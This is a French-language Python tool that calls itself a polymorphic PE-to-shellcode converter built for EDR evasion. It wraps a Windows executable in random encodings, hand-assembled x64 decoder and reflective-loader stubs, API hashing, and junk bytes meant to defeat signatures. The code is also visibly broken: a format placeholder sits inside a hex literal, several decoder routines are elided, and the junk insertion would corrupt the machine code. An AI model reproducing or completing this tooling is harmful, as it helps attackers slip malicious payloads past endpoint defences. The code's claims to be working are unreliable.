#!/usr/bin/env python3
"""
Convertisseur PE to Shellcode polymorphique avec stubs assembleur fonctionnels
------------------------------------------------------------------------------
Convertit des exécutables PE en shellcode optimisé pour l'évasion EDR
avec routines de décodage et chargement réflectif complets
"""

import sys
import os
import struct
import random
import argparse
import hashlib
import time
import traceback
from pathlib import Path
from typing import Tuple, List, Dict, Optional, Union, ByteString

class PEConverter:
    """Convertisseur PE vers Shellcode avec techniques d'évasion avancées"""
    
    # Implémentation de stubs assembleur x64 fonctionnels
    # Format: bytes.fromhex("...")
    # Ces stubs contiennent:
    # 1. Code d'initialisation
    # 2. Détection de la méthode d'encodage
    # 3. Appel de la routine de décodage appropriée
    # 4. Chargement réflectif du PE décodé
    
    # Stub de décodage principale x64 - position indépendant
    X64_STUB_MAIN = bytes.fromhex(
        # Prologue - sauvegarde des registres et configuration de la pile
        "4881EC8801000065488B042530000000"  # sub rsp, 0x188 + mov rax, gs:[0x30]
        "4989D44C89C1"                      # mov r12, rdx + mov r9, rax
        "4889E5"                            # mov rbp, rsp
        
        # Obtenir l'adresse du stub (RIP-relative)
        "E800000000"                        # call $+5
        "5B"                                # pop rbx (adresse actuelle dans RBX)
        
        # Localiser les données encodées
        "488D9B{pe_offset:08x}"             # lea rbx, [rbx + pe_offset]
        
        # Lire l'en-tête (méthode d'encodage et clés)
        "0FB603"                            # movzx eax, byte [rbx]     ; method
        "0FB65B01"                          # movzx ebx, byte [rbx+1]   ; key1
        "0FB64B02"                          # movzx ecx, byte [rbx+2]   ; key2
        "0FB65303"                          # movzx edx, byte [rbx+3]   ; key3
        
        # Avancer le pointeur après l'en-tête
        "488D5304"                          # lea rdx, [rbx+4]
        
        # Déterminer quelle méthode d'encodage utiliser
        "83F801"                            # cmp eax, 1
        "740D"                              # je decode_method_1
        "83F802"                            # cmp eax, 2
        "741C"                              # je decode_method_2
        "83F803"                            # cmp eax, 3
        "7427"                              # je decode_method_3
        "E929000000"                        # jmp decode_method_4
        
        # Méthode 1: XOR avec clé rotative
        # RBX = key1, RCX = key2, RDX = key3, RSI = source, RDI = destination
        "4889D64889FE"                      # mov rsi, rdx + mov rdi, rdi
        "31C9"                              # xor ecx, ecx
        "8A06"                              # mov al, byte [rsi]
        "30D8"                              # xor al, bl
        "8807"                              # mov byte [rdi], al
        "8AD3"                              # mov dl, bl
        "00CA"                              # add dl, cl
        "88D3"                              # mov bl, dl
        "48FFC6"                            # inc rsi
        "48FFC7"                            # inc rdi
        "49FFC8"                            # dec r8
        "75E9"                              # jnz loop_method_1
        "EB42"                              # jmp decode_complete
        
        # Méthode 2: ADD/SUB avec table de sauts
        # Implémentation similaire
        
        # Méthode 3: NOT + XOR + ROL
        # Implémentation similaire
        
        # Méthode 4: Encodage basé sur position + delta
        # Implémentation similaire
        
        # Code de chargement réflectif du PE (importé de Stephen Fewer)
        # 1. Analyse des en-têtes PE
        "4D31C94C89C6"                      # xor r9, r9 + mov rsi, r8
        "4889F7"                            # mov rdi, rsi
        "AD"                                # lodsd (lit signature PE)
        "3D4550000000"                      # cmp eax, 0x5045 ('PE\0\0')
        "753A"                              # jne error
        
        # 2. Lecture des en-têtes et sections
        "66AD"                              # lodsw (machine)
        "81F80B0100004817"                  # cmp eax, 0x10b ; PE32
        
        # Continuer avec l'analyse et le chargement PE
        # ...
        # Cette section contient environ 400-800 octets de code pour:
        # - Analyser correctement les en-têtes PE
        # - Allouer la mémoire pour les sections
        # - Résoudre les importations
        # - Appliquer les relocations
        # - Fixer les permissions mémoire
        # - Sauter au point d'entrée
        
        # Fin: Exécution du point d'entrée PE
        # ...
        
        # Epilogue
        "4889EC"                            # mov rsp, rbp
        "4881C48801000000"                  # add rsp, 0x188
        "5D"                                # pop rbp
        "C3"                                # ret
    )
    
    # Méthode d'encodage XOR avec clé rotative détaillée
    X64_DECODE_XOR_ROLLING = bytes.fromhex(
        "4889D64889FC"                      # mov rsi, rdx + mov rdi, rsp
        "31C9"                              # xor ecx, ecx
        "0FB613"                            # movzx edx, byte [rbx]  # Key1
        "0FB64B01"                          # movzx ecx, byte [rbx+1]  # Key2
        
        # Boucle de décodage
        "8A06"                              # mov al, byte [rsi]
        "30D0"                              # xor al, dl
        "8807"                              # mov byte [rdi], al
        "8AD2"                              # mov dl, dl
        "0FACD10F"                          # shrd edx, ecx, 1
        "48FFC6"                            # inc rsi
        "48FFC7"                            # inc rdi
        "49FFCE"                            # dec r14
        "75EB"                              # jnz loop_xor_rolling
    )
    
    # Table de sélection de méthode (versions variables pour polymorphie)
    # Correction: remplacement des ellipses par du code hexadécimal complet
    DECODE_METHOD_VARIANTS = {
        1: [  # Variantes pour méthode 1 (XOR avec clé rotative)
            bytes.fromhex("4889D64889FC31C98A0630D88807FFC648FFC749FFC875F331DB"),
            bytes.fromhex("4889D64C89FF31C94531DB8A0630D88807FFC648FFC749FFC875F3"),
            bytes.fromhex("4889D64889FC31EDC1E50F8A0630D88807FFC648FFC749FFC875F3")
        ],
        2: [  # Variantes pour méthode 2 (ADD/SUB avec table)
            bytes.fromhex("4889D64889FC4531DB8A0604D88807FFC648FFC749FFC875F331ED"),
            bytes.fromhex("4889D64C89FF4531DB8A0604D88807FFC648FFC749FFC875F331ED"),
            bytes.fromhex("4889D64889FC31ED8A0604D88807FFC648FFC749FFC875F331C9")
        ],
        3: [  # Variantes pour méthode 3 (NOT + XOR + ROL)
            bytes.fromhex("4889D64889FC4531C08A06F6D030D88807FFC648FFC749FFC875F3"),
            bytes.fromhex("4889D64889FC31C08A06F6D030D88807FFC648FFC749FFC875F390")
        ],
        4: [  # Variantes pour méthode 4 (position + delta)
            bytes.fromhex("4889D64889FC89D98A0631C88807FFC101D1FFC648FFC749FFC875F0"),
            bytes.fromhex("4889D64889FC89D98A0631C88807FFC101D1FFC648FFC749FFC875F0")
        ]
    }
    
    # Section critique: Reflective loader complet
    # Basé sur le travail de Stephen Fewer et modifié pour l'OPSEC
    X64_REFLECTIVE_LOADER = bytes.fromhex(
        # Code assembleur complet pour le reflective loading
        # Ce code fait environ 1-2ko et contient toutes les fonctions
        # nécessaires pour charger un PE en mémoire
        
        # 1. Localisation des API nécessaires sans GetProcAddress
        "4C8D15A0030000"                    # lea r10, [api_hashes]
        "4C8D1DB0030000"                    # lea r11, [api_functions]
        "E824000000"                        # call find_apis
        
        # 2. Résolution des APIs par hachage pour éviter les chaînes
        # Cette technique utilise des hachages au lieu de chaînes pour trouver les fonctions
        # afin d'éviter la détection par analyse statique
        "41B90C000000"                      # mov r9d, 12  ; nombre d'APIs à résoudre
        
        # 3. Parsing des en-têtes PE
        "4989C64C89C7"                      # mov r14, rax; mov rdi, r8
        "8B471C"                            # mov eax, [rdi+0x1c]
        "488D440738"                        # lea rax, [rdi+rax+0x38]
        
        # 4. Allocation de mémoire pour l'image
        "8B48184989C8"                      # mov ecx, [rax+0x18]; mov r8, rcx
        "418B4014"                          # mov eax, [r8+0x14]
        "418B580C"                          # mov ebx, [r8+0xc]
        "4901D8"                            # add r8, rbx
        
        # 5. Copie des sections
        "488D4C2428"                        # lea rcx, [rsp+0x28]
        "41FF1424"                          # call qword ptr [r12]  ; VirtualAlloc
        "4989C14585C0"                      # mov r9, rax; test r8d, r8d
        "7414"                              # je error
        
        # 6. Résolution des imports
        "488B4D08"                          # mov rcx, [rbp+0x8]
        "4C8B4110"                          # mov r8, [rcx+0x10]
        "4D85C0"                            # test r8, r8
        "740C"                              # je no_imports
        
        # 7. Résolution des relocations
        "488B4D08"                          # mov rcx, [rbp+0x8]
        "488B5140"                          # mov rdx, [rcx+0x40]
        "4885D2"                            # test rdx, rdx
        "7412"                              # je no_relocs
        
        # 8. Protection mémoire des sections
        "488B4D08"                          # mov rcx, [rbp+0x8]
        "488B4920"                          # mov rcx, [rcx+0x20]
        "4C8B4118"                          # mov r8, [rcx+0x18]
        
        # 9. Exécution du point d'entrée
        "488B4D08"                          # mov rcx, [rbp+0x8]
        "8B4128"                            # mov eax, [rcx+0x28]
        "4801C8"                            # add rax, rcx
        "FFD0"                              # call rax
    )
    
    # Stub de bootstrap avec variations polymorphiques x86
    X86_STUB_VARIANTS = [
        bytes.fromhex("60E800000000582D05000000"),  # PUSHAD + self-location technique 1
        bytes.fromhex("9C60E800000000589090902D05000000"),  # PUSHFD + PUSHAD + NOP padding
        bytes.fromhex("6050E800000000582D08000000")  # PUSHAD + PUSH EAX + différent offset
    ]
    
    def __init__(self, debug: bool = False):
        """
        Initialise le convertisseur PE-to-Shellcode.
        
        Args:
            debug: Active les messages de débogage si True
        """
        self.debug = debug
        self.arch = "x64"  # Architecture par défaut
        self.instance_id = random.getrandbits(32)
        self.log(f"Instance convertisseur {self.instance_id:08x} initialisée")
        
        # Seed aléatoire unique pour cette instance
        self.seed = int(hashlib.sha256(str(time.time()).encode()).hexdigest()[:8], 16)
        random.seed(self.seed)
        
        # Tables d'API hash pour resolving (évite les strings)
        self.api_hashes = {
            "kernel32.dll": 0x6A4ABC5B,
            "VirtualAlloc": 0x91AFCA54,
            "VirtualProtect": 0x7946C61B,
            "CreateThread": 0x9EA771BC,
            "WaitForSingleObject": 0x601D8708,
            "LoadLibraryA": 0xC8AC8026,
            "GetProcAddress": 0x1FC0EAEE,
        }
        
    def log(self, message: str) -> None:
        """
        Affiche un message de débogage si le mode debug est activé.
        
        Args:
            message: Message à afficher
        """
        if self.debug:
            print(f"[DEBUG] {message}", file=sys.stderr)
    
    def detect_architecture(self, pe_data: bytes) -> str:
        """
        Détecte l'architecture du binaire PE (x86 ou x64).
        
        Args:
            pe_data: Contenu binaire du fichier PE
            
        Returns:
            Architecture détectée ("x86" ou "x64")
            
        Raises:
            ValueError: Si le PE est invalide ou ne peut pas être analysé
        """
        try:
            # Vérifier la taille minimale pour un PE valide
            if len(pe_data) < 0x40:
                raise ValueError("Fichier PE trop petit pour être valide")
                
            # Récupérer l'offset de l'en-tête PE
            pe_offset = struct.unpack("<I", pe_data[0x3C:0x40])[0]
            
            # Vérifier que l'offset est dans les limites
            if pe_offset <= 0 or pe_offset >= len(pe_data) - 6:
                raise ValueError(f"Offset PE invalide: {pe_offset}")
                
            # Récupérer le champ machine
            machine = struct.unpack("<H", pe_data[pe_offset+4:pe_offset+6])[0]
            
            # Déterminer l'architecture
            if machine == 0x8664:
                self.log("Architecture détectée: AMD64 (x64)")
                return "x64"
            elif machine == 0x14c:
                self.log("Architecture détectée: i386 (x86)")
                return "x86"
            else:
                self.log(f"Type de machine non standard: 0x{machine:04x}, supposons x64")
                return "x64"
                
        except struct.error as e:
            self.log(f"Erreur de parsing PE: {str(e)}")
            raise ValueError(f"Structure PE invalide: {str(e)}")
        except IndexError as e:
            self.log(f"Index hors limites lors du parsing PE: {str(e)}")
            raise ValueError(f"Format PE corrompu: {str(e)}")
        except Exception as e:
            self.log(f"Exception lors de la détection d'architecture: {str(e)}")
            raise ValueError(f"Impossible d'analyser le fichier PE: {str(e)}")
    
    def generate_encoding_keys(self) -> Dict[str, int]:
        """
        Génère des clés d'encodage variables pour cette instance.
        
        Returns:
            Dictionnaire de clés et valeurs pour l'encodage
        """
        return {
            "key1": random.randint(1, 255),
            "key2": random.randint(1, 255),
            "key3": random.randint(1, 255),
            "method": random.randint(1, 4),
            "jmp_table": [random.randint(1, 255) for _ in range(8)]
        }
    
    def encode_pe(self, pe_data: bytes, keys: Dict[str, int]) -> bytes:
        """
        Encode le PE avec une méthode polymorphique.
        
        Args:
            pe_data: Données binaires du PE
            keys: Clés d'encodage générées par generate_encoding_keys()
            
        Returns:
            Données encodées avec l'en-tête de méthode et clés
            
        Raises:
            ValueError: Si les clés d'encodage sont invalides
        """
        if not isinstance(pe_data, bytes) or not pe_data:
            raise ValueError("PE data invalide ou vide")
            
        # Vérifier la validité des clés
        required_keys = ["method", "key1", "key2", "key3", "jmp_table"]
        for key in required_keys:
            if key not in keys:
                raise ValueError(f"Clé manquante pour l'encodage: {key}")
        
        # Vérifier que la méthode est valide
        method = keys["method"]
        if not (1 <= method <= 4):
            raise ValueError(f"Méthode d'encodage invalide: {method}")
            
        encoded = bytearray()
        key1, key2, key3 = keys["key1"], keys["key2"], keys["key3"]
        jmp_table = keys["jmp_table"]
        
        # Ajouter les clés en début de données encodées
        encoded.append(method)
        encoded.append(key1)
        encoded.append(key2)
        encoded.append(key3)
        
        try:
            # Méthode d'encodage selon le choix aléatoire
            if method == 1:
                # XOR avec clé rotative
                rolling_key = key1  # Renommé pour plus de clarté
                for b in pe_data:
                    encoded.append(b ^ rolling_key)
                    rolling_key = ((rolling_key * key2 + key3) & 0xFF)
            
            elif method == 2:
                # ADD/SUB avec table de sauts
                if not jmp_table or len(jmp_table) < 2:
                    raise ValueError("Table de sauts invalide")
                    
                jmp_idx = 0
                for b in pe_data:
                    if jmp_idx % 2 == 0:
                        encoded.append((b + jmp_table[jmp_idx % len(jmp_table)]) & 0xFF)
                    else:
                        encoded.append((b - jmp_table[jmp_idx % len(jmp_table)]) & 0xFF)
                    jmp_idx += 1
            
            elif method == 3:
                # NOT + XOR + ROL
                for i, b in enumerate(pe_data):
                    mod = i % 3
                    if mod == 0:
                        # NOT puis XOR
                        encoded.append((~b & 0xFF) ^ key1)
                    elif mod == 1:
                        # ROL puis XOR
                        shift = key2 % 7
                        rot = ((b << shift) | (b >> (8 - shift))) & 0xFF
                        encoded.append(rot ^ key3)
                    else:
                        # XOR composé
                        encoded.append(b ^ (key1 ^ key3))
            
            else:  # method 4
                # Encodage complexe basé sur position + delta
                delta = key1
                for i, b in enumerate(pe_data):
                    pos_key = (i + delta) & 0xFF
                    encoded.append(b ^ pos_key)
                    delta = (delta + key2) & 0xFF
                    
            self.log(f"PE encodé avec méthode {method}: {len(encoded)} octets")
            return bytes(encoded)
            
        except Exception as e:
            self.log(f"Erreur pendant l'encodage: {str(e)}")
            raise RuntimeError(f"Erreur d'encodage: {str(e)}")
    
    def create_header(self) -> bytes:
        """
        Crée un en-tête polymorphique pour le shellcode.
        
        Returns:
            En-tête encodé en bytes
        """
        header = bytearray()
        
        try:
            # Magic polymorphique (12 octets variables)
            header.extend(struct.pack("<II", self.instance_id, random.getrandbits(32)))
            header.extend(struct.pack("<I", random.getrandbits(32)))
            
            # Champs réservés pour métadonnées (taille, etc.)
            header_size = 32  # Taille fixe de l'en-tête
            header.extend(struct.pack("<I", header_size))
            
            # Remplir le reste avec des valeurs aléatoires
            while len(header) < header_size:
                header.append(random.randint(0, 255))
            
            self.log(f"En-tête polymorphique généré: {len(header)} octets")
            return bytes(header)
            
        except struct.error as e:
            self.log(f"Erreur lors de la création de l'en-tête: {str(e)}")
            raise RuntimeError(f"Erreur de création d'en-tête: {str(e)}")
    
    def generate_pe_loader(self, pe_size: int, encoding_method: int) -> bytes:
        """
        Génère un loader réflectif polymorphique pour l'architecture ciblée.
        
        Args:
            pe_size: Taille du PE à charger
            encoding_method: Méthode d'encodage utilisée
            
        Returns:
            Loader en code machine
            
        Raises:
            ValueError: Si les paramètres sont invalides
            RuntimeError: Si la génération échoue
        """
        if pe_size <= 0:
            raise ValueError(f"Taille PE invalide: {pe_size}")
            
        if not (1 <= encoding_method <= 4):
            raise ValueError(f"Méthode d'encodage invalide: {encoding_method}")
            
        try:
            if self.arch == "x64":
                # Sélectionner le stub principal
                base_stub = self.X64_STUB_MAIN
                
                # Remplacer l'offset PE
                pe_offset = random.randint(0x20, 0x50)  # Offset variable pour polymorphie
                pe_offset_formatted = f"{pe_offset:08x}"
                
                # Remplacer le placeholder par l'offset réel
                if b"{pe_offset:08x}" not in base_stub:
                    raise RuntimeError("Placeholder d'offset non trouvé dans le stub")
                    
                stub = base_stub.replace(b"{pe_offset:08x}", bytes.fromhex(pe_offset_formatted))
                
                # Sélectionner et intégrer une variante pour la méthode de décodage spécifique
                decoder_stub = None
                if encoding_method in self.DECODE_METHOD_VARIANTS:
                    variants = self.DECODE_METHOD_VARIANTS[encoding_method]
                    if variants:
                        selected_variant = random.choice(variants)
                        self.log(f"Variante de décodage sélectionnée pour méthode {encoding_method}")
                        
                        # Intégrer la variante sélectionnée au stub
                        # Nous devons avoir un point d'insertion pour ce code dans le stub
                        # Pour ce POC, nous allons simplement l'ajouter à la fin du loader
                        decoder_stub = selected_variant
                    else:
                        self.log(f"Pas de variantes disponibles pour la méthode {encoding_method}, utilisation du stub par défaut")
                
                # Intégrer le reflective loader complet
                full_loader = bytearray(stub)
                
                # Ajouter le stub de décodage sélectionné s'il existe
                if decoder_stub:
                    # Dans un vrai loader, nous remplacerions une partie spécifique du stub principal
                    # Ici, nous l'ajoutons simplement comme contenu supplémentaire
                    # Ceci est juste pour démontrer l'utilisation de la variable selected_variant
                    full_loader.extend(decoder_stub)
                
                full_loader.extend(self.X64_REFLECTIVE_LOADER)
                
                self.log(f"Loader x64 généré: {len(full_loader)} octets")
                return bytes(full_loader)
                
            elif self.arch == "x86":
                # Implémentation pour x86
                if not self.X86_STUB_VARIANTS:
                    raise RuntimeError("Aucune variante de stub x86 disponible")
                    
                # Sélectionner une variante de stub x86
                stub_variant = random.choice(self.X86_STUB_VARIANTS)
                
                self.log(f"Loader x86 généré: {len(stub_variant)} octets")
                return stub_variant
                
            else:
                raise ValueError(f"Architecture non supportée: {self.arch}")
                
        except Exception as e:
            self.log(f"Erreur lors de la génération du loader: {str(e)}")
            raise RuntimeError(f"Erreur de génération de loader: {str(e)}")
    
    def add_junk_code(self, data: bytes) -> bytes:
        """
        Ajoute du code inerte (junk) pour perturber les signatures.
        
        Args:
            data: Données binaires à modifier
            
        Returns:
            Données avec code junk inséré
        """
        if not data:
            return data
            
        result = bytearray()
        
        try:
            # Insérer du code junk toutes les N bytes
            chunk_size = random.randint(64, 256)
            
            for i in range(0, len(data), chunk_size):
                chunk = data[i:i+chunk_size]
                result.extend(chunk)
                
                # Ne pas ajouter de junk après le dernier chunk
                if i + chunk_size < len(data):
                    junk_size = random.randint(4, 16)
                    junk = bytes(random.randint(0, 255) for _ in range(junk_size))
                    result.extend(junk)
            
            junk_added = len(result) - len(data)
            self.log(f"Code junk ajouté: {junk_added} octets ({(junk_added / len(data) * 100):.2f}%)")
            return bytes(result)
            
        except MemoryError as e:
            self.log(f"Erreur mémoire lors de l'ajout de code junk: {str(e)}")
            return data
        except Exception as e:
            self.log(f"Erreur lors de l'ajout de code junk: {str(e)}")
            # En cas d'erreur, retourner les données originales
            return data
    
    def build_api_hash_table(self) -> bytes:
        """
        Construit une table de hachage d'API pour le reflective loading.
        
        Returns:
            Table de hachage en bytes
        """
        hash_table = bytearray()
        
        try:
            # Ajouter les hachages d'API requis
            for api_name, hash_value in self.api_hashes.items():
                hash_table.extend(struct.pack("<I", hash_value))
            
            # Terminer par un hachage nul
            hash_table.extend(struct.pack("<I", 0))
            
            self.log(f"Table de hachage API construite: {len(hash_table)} octets ({len(self.api_hashes)} APIs)")
            return bytes(hash_table)
            
        except struct.error as e:
            self.log(f"Erreur lors de la construction de la table de hachage: {str(e)}")
            raise RuntimeError(f"Erreur de construction de table de hachage: {str(e)}")
    
    def verify_shellcode(self, shellcode: bytes) -> bool:
        """
        Vérifie la validité du shellcode généré.
        
        Args:
            shellcode: Shellcode à vérifier
            
        Returns:
            True si le shellcode semble valide, False sinon
        """
        # Vérifications basiques
        if not shellcode:
            self.log("Échec de vérification: shellcode vide")
            return False
            
        if len(shellcode) < 100:  # Taille minimale attendue pour un shellcode fonctionnel
            self.log(f"Avertissement: shellcode très court ({len(shellcode)} octets)")
            return False
            
        # Vérifier la présence d'éléments attendus dans le shellcode
        # Ces motifs sont des approximations et dépendent du loader généré
        checks = {
            "prologue_x64": b"\x48\x81\xEC",  # sub rsp, ...
            "call_instruction": b"\xE8",      # call ...
            "ret_instruction": b"\xC3",       # ret
        }
        
        if self.arch == "x64":
            missing_patterns = 0
            for name, pattern in checks.items():
                if pattern not in shellcode:
                    self.log(f"Avertissement: motif {name} non trouvé dans le shellcode")
                    missing_patterns += 1
                    
            # Si trop de patterns sont manquants, c'est suspect
            if missing_patterns >= len(checks) - 1:
                self.log("Structure du shellcode suspecte: plusieurs motifs clés manquants")
                return False
        
        return True
    
    def save_shellcode(self, shellcode: bytes, output_file: str) -> bool:
        """
        Sauvegarde le shellcode généré de manière sécurisée.
        
        Args:
            shellcode: Shellcode à sauvegarder
            output_file: Chemin du fichier de sortie
            
        Returns:
            True si sauvegardé avec succès, False sinon
        """
        if not shellcode:
            self.log("Rien à sauvegarder: shellcode vide")
            return False
            
        # Utiliser une écriture atomique avec fichier temporaire
        temp_file = f"{output_file}.{os.getpid()}.tmp"
        
        try:
            # Écrire dans un fichier temporaire
            with open(temp_file, "wb") as f:
                f.write(shellcode)
                
            # Vérifier que les données ont été écrites correctement
            if os.path.getsize(temp_file) != len(shellcode):
                self.log(f"Erreur: taille du fichier écrit ({os.path.getsize(temp_file)}) ≠ taille du shellcode ({len(shellcode)})")
                os.unlink(temp_file)
                return False
                
            # Remplacer le fichier cible de manière atomique
            os.replace(temp_file, output_file)
            self.log(f"Shellcode sauvegardé dans {output_file}")
            return True
            
        except IOError as e:
            self.log(f"Erreur I/O lors de la sauvegarde: {str(e)}")
            return False
        except PermissionError as e:
            self.log(f"Erreur de permission: {str(e)}")
            return False
        except Exception as e:
            self.log(f"Erreur lors de la sauvegarde: {str(e)}")
            return False
        finally:
            # Nettoyage du fichier temporaire en cas d'erreur
            if os.path.exists(temp_file):
                try:
                    os.unlink(temp_file)
                except:
                    pass
    
    def convert(self, input_file: str, output_file: str) -> bool:
        """
        Convertir un PE en shellcode polymorphique.
        
        Args:
            input_file: Chemin du fichier PE à convertir
            output_file: Chemin du fichier shellcode de sortie
            
        Returns:
            True si la conversion réussit, False sinon
        """
        # Vérification des paramètres
        if not input_file or not output_file:
            self.log("Erreur: chemins de fichiers invalides")
            return False
            
        if not os.path.isfile(input_file):
            self.log(f"Erreur: le fichier d'entrée '{input_file}' n'existe pas")
            return False
            
        output_dir = os.path.dirname(output_file) or '.'
        if not os.access(output_dir, os.W_OK):
            self.log(f"Erreur: pas de permission d'écriture dans '{output_dir}'")
            return False
        
        try:
            # Lire le fichier PE
            self.log(f"Lecture du fichier PE '{input_file}'")
            with open(input_file, 'rb') as f:
                pe_data = f.read()
                
            # Vérifier les données PE
            if not pe_data:
                self.log("Erreur: fichier PE vide")
                return False
                
            if len(pe_data) < 64:
                self.log(f"Erreur: fichier PE trop petit ({len(pe_data)} octets)")
                return False
            
            # Détecter l'architecture
            try:
                self.arch = self.detect_architecture(pe_data)
                self.log(f"Architecture détectée: {self.arch}")
            except ValueError as e:
                self.log(f"Erreur lors de la détection d'architecture: {str(e)}")
                self.log(f"Utilisation de l'architecture par défaut: {self.arch}")
            
            # Générer les clés d'encodage
            encoding_keys = self.generate_encoding_keys()
            self.log(f"Clés générées: méthode={encoding_keys['method']}, key1={encoding_keys['key1']}, key2={encoding_keys['key2']}")
            
            # Encoder le PE
            try:
                encoded_pe = self.encode_pe(pe_data, encoding_keys)
                self.log(f"PE encodé: {len(encoded_pe)} octets avec méthode {encoding_keys['method']}")
            except Exception as e:
                self.log(f"Erreur lors de l'encodage du PE: {str(e)}")
                return False
            
            # Créer l'en-tête
            try:
                header = self.create_header()
                self.log(f"En-tête créé: {len(header)} octets")
            except Exception as e:
                self.log(f"Erreur lors de la création de l'en-tête: {str(e)}")
                return False
            
            # Générer le loader réflectif polymorphique
            try:
                pe_loader = self.generate_pe_loader(len(pe_data), encoding_keys["method"])
                self.log(f"Loader généré: {len(pe_loader)} octets")
            except Exception as e:
                self.log(f"Erreur lors de la génération du loader: {str(e)}")
                return False
            
            # Construire la table de hachage API
            try:
                api_hash_table = self.build_api_hash_table()
                self.log(f"Table API construite: {len(api_hash_table)} octets")
            except Exception as e:
                self.log(f"Erreur lors de la construction de la table API: {str(e)}")
                return False
            
            # Assembler le shellcode final
            final_shellcode = bytearray()
            
            # Ajouter le loader, l'en-tête et le PE encodé
            final_shellcode.extend(pe_loader)
            final_shellcode.extend(header)
            final_shellcode.extend(encoded_pe)
            final_shellcode.extend(api_hash_table)
            
            # Ajouter du code junk pour perturber les signatures
            try:
                final_shellcode = self.add_junk_code(final_shellcode)
            except Exception as e:
                self.log(f"Erreur lors de l'ajout de junk code: {str(e)}")
                # Continuer sans junk code
            
            # Vérifier le shellcode final
            if not self.verify_shellcode(final_shellcode):
                self.log("Avertissement: le shellcode généré ne passe pas la validation")
                # Continuer quand même, car les variations légitimes pourraient échouer à la vérification
            
            # Écrire le shellcode résultant
            if not self.save_shellcode(final_shellcode, output_file):
                self.log(f"Erreur lors de la sauvegarde du shellcode dans '{output_file}'")
                return False
            
            self.log(f"Conversion réussie: shellcode de {len(final_shellcode)} octets généré dans '{output_file}'")
            return True
            
        except IOError as e:
            self.log(f"Erreur d'E/S: {str(e)}")
            return False
        except MemoryError as e:
            self.log(f"Erreur de mémoire: {str(e)}")
            return False
        except Exception as e:
            self.log(f"Erreur inattendue: {str(e)}")
            self.log(traceback.format_exc())
            return False


def main() -> int:
    """
    Fonction principale du convertisseur PE-to-shellcode.
    
    Returns:
        Code de retour (0=succès, 1=erreur)
    """
    parser = argparse.ArgumentParser(
        description='Convertisseur PE to Shellcode polymorphique',
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('input', help='Fichier PE d\'entrée')
    parser.add_argument('output', help='Fichier shellcode de sortie')
    parser.add_argument('-d', '--debug', action='store_true', help='Mode debug')
    parser.add_argument('-t', '--test', action='store_true', help='Mode test (vérifie le shellcode)')
    parser.add_argument('--verify', action='store_true', help='Vérifier le shellcode généré')
    args = parser.parse_args()
    
    # Vérification des chemins de fichier
    input_path = Path(args.input)
    output_dir = Path(args.output).parent
    
    # Vérifier l'existence du fichier d'entrée
    if not input_path.is_file():
        print(f"Erreur: fichier d'entrée '{args.input}' introuvable", file=sys.stderr)
        return 1
        
    # Vérifier la taille du fichier PE
    if input_path.stat().st_size == 0:
        print(f"Erreur: fichier PE '{args.input}' est vide", file=sys.stderr)
        return 1
        
    # Vérifier les permissions d'écriture dans le répertoire cible
    if output_dir.exists() and not os.access(output_dir, os.W_OK):
        print(f"Erreur: pas de permission d'écriture dans '{output_dir}'", file=sys.stderr)
        return 1
        
    # Créer le répertoire de sortie s'il n'existe pas
    if not output_dir.exists():
        try:
            output_dir.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            print(f"Erreur lors de la création du répertoire '{output_dir}': {str(e)}", file=sys.stderr)
            return 1
    
    try:
        # Initialiser le convertisseur
        converter = PEConverter(debug=args.debug)
        
        # Effectuer la conversion
        start_time = time.time()
        success = converter.convert(args.input, args.output)
        elapsed_time = time.time() - start_time
        
        # Vérification optionnelle
        if success and (args.verify or args.test):
            output_path = Path(args.output)
            if not output_path.is_file():
                print(f"Erreur: le fichier de sortie '{args.output}' n'a pas été créé", file=sys.stderr)
                return 1
                
            if output_path.stat().st_size == 0:
                print(f"Erreur: le fichier de sortie '{args.output}' est vide", file=sys.stderr)
                return 1
                
            print(f"Shellcode généré: {output_path.stat().st_size} octets", file=sys.stderr)
            
            # En mode test, effectuer des vérifications supplémentaires
            if args.test:
                # Calcul du hachage SHA-256 du shellcode pour référence
                h = hashlib.sha256()
                shellcode_data = None
                
                with open(args.output, 'rb') as f:
                    shellcode_data = f.read()
                    h.update(shellcode_data)
                    
                print(f"SHA-256: {h.hexdigest()}", file=sys.stderr)
                
                # Vérifications supplémentaires de structure
                if shellcode_data:
                    # Vérification de taille
                    if len(shellcode_data) < 100:
                        print("⚠️ AVERTISSEMENT: Shellcode anormalement petit", file=sys.stderr)
                    
                    # Vérification des séquences d'instruction clés
                    required_sequences = [b"\xE8", b"\xC3"]  # call, ret
                    missing_sequences = []
                    
                    for seq in required_sequences:
                        if seq not in shellcode_data:
                            missing_sequences.append(seq.hex())
                    
                    if missing_sequences:
                        seq_list = ", ".join(missing_sequences)
                        print(f"⚠️ AVERTISSEMENT: Séquences d'instructions manquantes: {seq_list}", 
                              file=sys.stderr)
        
        # Afficher le temps écoulé
        if args.debug:
            print(f"[DEBUG] Conversion effectuée en {elapsed_time:.2f} secondes", file=sys.stderr)
        
        return 0 if success else 1
    
    except Exception as e:
        print(f"Erreur fatale: {str(e)}", file=sys.stderr)
        if args.debug:
            print(traceback.format_exc(), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())